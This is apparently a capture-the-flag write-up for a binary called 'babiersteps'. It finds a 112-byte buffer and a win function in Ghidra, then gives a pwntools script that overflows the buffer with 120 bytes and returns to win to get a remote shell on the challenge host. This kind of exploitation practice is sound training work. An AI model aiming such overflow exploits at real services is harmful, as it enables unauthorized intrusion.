![image](https://user-images.githubusercontent.com/80063008/166221564-c62ee6ce-bd6e-4a01-99ca-8a2da4bc664c.png)

Opening the binary in Ghidra we can see that it takes an input buffer of 112 bytes.

![image](https://user-images.githubusercontent.com/80063008/166223098-a7658974-9274-4b9c-98ba-97fba7bf1354.png)

We see it also has a win function.

![image](https://user-images.githubusercontent.com/80063008/166223171-8188f335-5a11-40f1-9a9f-aa77a5a1f325.png)

We can overflow that with 120 As and then return to the win function which executes /bin/sh. Here is the python script for it.


```python
from pwn import *

target = remote("challenge.nahamcon.com", 31373)
elf = ELF("./babiersteps")

payload = b"A" * 120
payload += p64(elf.symbols['win'])

target.send(payload)
target.interactive()
```

![image](https://user-images.githubusercontent.com/80063008/166223260-e9017084-0768-490d-a16a-2ec28cc78ede.png)
